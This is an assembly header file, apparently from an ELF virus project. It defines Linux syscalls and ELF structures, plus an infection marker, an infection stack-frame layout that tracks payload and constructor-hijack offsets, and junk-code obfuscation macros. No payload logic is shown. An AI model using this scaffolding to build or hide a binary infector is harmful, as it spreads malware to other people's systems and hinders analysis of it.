%ifndef DEFINES_S
%define DEFINES_S

%define SYS_READ        0x00
%define SYS_WRITE       0x01
%define SYS_OPEN        0x02
%define SYS_CLOSE       0x03
%define SYS_LSEEK       0x08
%define SYS_MMAP        0x09
%define SYS_MPROTECT    0x0a
%define SYS_MUNMAP      0x0b
%define SYS_MREMAP      0x19
%define SYS_MSYNC       0x1a
%define SYS_EXIT        0x3c
%define SYS_KILL        0x3e
%define SYS_FTRUNCATE   0x4d
%define SYS_CHDIR       0x50
%define SYS_FCHDIR      0x51
%define SYS_PTRACE      0x65
%define SYS_GETPPID     0x6e
%define SYS_GETDENTS64  0xd9

%define O_RDONLY        0
%define O_RDWR          0o02
%define O_DIRECTORY     0o0200000
%define O_WRONLY        0o01
%define O_CREAT         0o0100
%define O_TRUNC         0o01000

%define SEEK_END        2

%define PROT_READ       1
%define PROT_WRITE      2
%define PROT_EXEC       4

%define MAP_PRIVATE     0x02
%define MAP_SHARED      0x01
%define MAP_ANONYMOUS   0x20

%define MREMAP_MAYMOVE  1

%define MS_SYNC         0x04

%define SIGKILL         9

; struc       linux_dirent64
;     d_ino:          resq    1
;     d_off:          resq    1
;     d_reclen:       resw    1
;     d_type:         resb    1
;     d_name:         resb    255
; endstruc

; %define DIRENT_MAX_SIZE 1024
; %define D_RECLEN_SUB    19
; %define DT_REG          8
; %define DT_DIR          4

; struc       Elf64_Ehdr
;     e_ident:        resb    16
;     e_type:         resw    1
;     e_machine:      resw    1
;     e_version:      resd    1
;     e_entry:        resq    1
;     e_phoff:        resq    1
;     e_shoff:        resq    1
;     e_flags:        resd    1
;     e_ehsize:       resw    1
;     e_phentsize:    resw    1
;     e_phnum:        resw    1
;     e_shentsize:    resw    1
;     e_shnum:        resw    1
;     e_shstrndx:     resw    1
; endstruc

; %define ELFHDR_SIZE     64

; %define ELF_MAGIC       0x464c457f
; %define EI_CLASS        4
; %define EI_DATA         5
; %define ELFCLASS64      2
; %define ELFDATA2LSB     1
; %define ET_EXEC         2
; %define ET_DYN          3
; %define EI_PAD          9

; struc       Elf64_Phdr
;     p_type:         resd    1
;     p_flags:        resd    1
;     p_offset:       resq    1
;     p_vaddr:        resq    1
;     p_paddr:        resq    1
;     p_filesz:       resq    1
;     p_memsz:        resq    1
;     p_align:        resq    1
; endstruc

; %define PT_LOAD         1
; %define PF_X            (1 << 0)
; %define PF_W            (1 << 1)
; %define PF_R            (1 << 2)

; struc       Elf64_Shdr
;     sh_name:        resd    1
;     sh_type:        resd    1
;     sh_flags:       resq    1
;     sh_addr:        resq    1
;     sh_offset:      resq    1
;     sh_size:        resq    1
;     sh_link:        resd    1
;     sh_info:        resd    1
;     sh_addralign:   resq    1
;     sh_entsize:     resq    1
; endstruc

; %define SHT_PROGBITS    1
; %define SHT_NOBITS      8
; %define SHT_RELA        4
; %define SHT_INIT_ARRAY  14

; %define SHF_TLS         (1 << 10)

; %define INFECTION_MAGIC 0xcafefeed

; struc       Infection_stack_frame ; Not really a structure but it will help to clarify the code
;     filename:                   resq    1
;     fd:                         resd    1
;     pad_align:                  resd    1
;     e_hdr:                      resb    ELFHDR_SIZE
;     file_size:                  resq    1
;     map:                        resq    1
;     text_phdr_off:              resq    1
;     data_phdr_off:              resq    1
;     old_text_size:              resq    1
;     last_text_shdr_off:         resq    1
;     init_array_shdr_off:        resq    1
;     bss_shdr_off:               resq    1
;     old_init_func:              resq    1
;     payload_base_address:       resq    1
;     payload_base_offset:        resq    1
;     init_rela_entry_off:        resq    1
;     new_file_size:              resq    1
;     payload_data_base_address:  resq    1
;     payload_data_base_offset:   resq    1
; endstruc

; %define STACK_FRAME_SIZE    0xc0

; struc       Elf64_Rela
;     r_offset:       resq    1
;     r_info:         resq    1
;     r_addend:       resq    1
; endstruc

; %define RELA_SIZE   0x30

; %define OBF_FAKE_JUMP db 0xeb, 0x01, 0xe9

; %macro OBF_USELESS_INSTR 1
;     jmp     %%end_bullshit
;     %if %0 = 1
;         mov     rax, [rsp + 0x8]
;         xor     rbx, rbx
;         add     rax, rbx
;         mov     rdi, rax
;         mov     rsi, rdx
;         mov     rax, rcx
;         syscall
;     %elif %0 = 2
;         mov     rax, rcx
;         cqo
;         div     rbx
;         mov     rcx, rdx
;         add     rax, rcx
;         or      rax, rdx
;     %else
;         mov     rax, rdx
;         test    rax, rax
;         jz      quit_infect
;         cmp     al, 12
;         jle     hijack_constructor
;         cmp     rax, rbx
;         ja      remap_and_infect_data
;     %endif
;     %%end_bullshit:
; %endmacro

; %macro PUSH_RET 0
;     push    rax
;     push    rax
;     lea     rax, [rel %%ret_to]
;     mov     QWORD [rsp + 0x8], rax
;     pop     rax
;     ret
;     %%ret_to:
; %endmacro

%endif
